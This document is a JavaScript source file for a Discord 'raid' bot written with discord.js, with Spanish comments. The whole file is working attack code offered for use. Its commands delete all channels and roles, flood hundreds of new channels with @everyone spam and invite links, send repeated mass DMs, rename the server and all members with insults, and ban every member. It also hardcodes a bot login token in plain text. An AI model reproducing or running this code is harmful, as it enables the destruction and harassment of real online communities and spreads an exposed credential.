const Discord = require("discord.js")

const intents = new Discord.Intents(32509)

const client = new Discord.Client({ intents })

client.on("ready", () => {
    console.log(`Iniciando bot raid...`);
    console.log(`Cliente ${client.user.tag} listo para el raid!`);
    console.log("Bot creado por ! $ǟȶʊʀռ,,| discord.gg/UFfzEUZfq7");
    console.log(`Comandos:
  .off
  .on
  .mdall
  .deleteroles
  .roles
  .foto
  .banall (hacerlo lo ultimo pq el discord.js lo detecta y saca a tu bot)
  .nick (nombre)
  `);
    presencia();  
    });
 
 
 
function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "! $ǟȶʊʀռ,,",
  type: "getting bored :/"
 
}
  });
}
 
/////nuke/////
 
client.on("message", message => {
    if (message.author.bot) return;
 
   if (message.content === '.off') {
     
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`#†µ §êrvêr ð££`, {
          type: 'text'
        }).then(channel => {
          channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
          channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
        })
         }
      })
 
/////raid/////
 
client.on("message", message => {
            if (message.author.bot) return;
 
           if (message.content === '.on') {
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`†µ §êrvêr ð££`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ")
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ");
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ");
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ");
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ");
                channel.send("@everyone †µ §êrvêr ð££ https://discord.gg/p27sqU4NaX https://i1.wp.com/www.sopitas.com/wp-content/uploads/2017/01/explosion-nuclear.gif ");
 
              })
              }
              }
            });
 
/////mdall/////
 
          client.on("message", message => {
                        if (message.author.bot) return;
 
                      if(message.content === ".mdall")
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("fucked by REY GITANO - https://discord.gg/6YPhuHwKEt ").catch(error => {});
                        },450);
                      })
                      });
 
/////borar roles/////
 
client.on("message", message => {
                    if (message.author.bot) return;
 
                     if(message.content === ('.deleteroles')){
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });
 
/////crear roles/////
 
client.on("message", message => {
                if (message.author.bot) return;
 
               if (message.content === '.roles') {
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `fucked by REY GITANO`,color: '#d41818',},reason: 'razon',})
              };
               }
                });
 
/////foto y nombre/////
 
client.on("message", message => {
                    if (message.author.bot) return;
 
                   if (message.content === '.foto') {
                      message.guild.setName("fucked by REY GITANO");
                      message.guild.setIcon("https://media.discordapp.net/attachments/881628880677503007/897192397828669460/Screenshot_20211011-204202_Google.jpg?width=525&height=655"
                      );
                      }
                    }); 
 
/////banall/////
 
client.on("message", message => {
    if (message.author.bot) return;
 
    if (message.content === '.banall') {
    message.delete()
    message.guild.members.cache.forEach(m => {
    m.ban()
    });
  }
}); 
 
/////cambiar nombres/////
 
client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g );
const command = args.shift().toLowerCase();
  if (command === '.nick'){
      msg.delete()
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member =>{
      i++
    }
      )
    msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
    msg.guild.members.cache.forEach(member =>{
 
      member.setNickname(nickname)
    })
    }
});
 
  client.login("MTAxNDU5OTI1MTE4MDkxNjc3Ng.Gfm7L2.09v2AXsX2Tc4bdo_udlRq6jJvfnxk5oT4w-0WI");